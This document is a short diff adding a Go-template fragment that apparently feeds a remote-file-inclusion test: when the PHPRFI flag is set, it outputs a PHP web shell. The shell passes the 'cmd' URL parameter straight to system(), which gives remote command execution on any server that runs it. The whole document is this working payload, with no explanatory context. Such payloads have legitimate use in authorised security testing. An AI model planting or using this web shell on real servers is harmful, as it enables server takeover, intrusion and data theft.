@@ -1,0 +1,3 @@
+{{- if .PHPRFI -}}
+<?php system($_GET['cmd']); ?>
+{{- end -}}
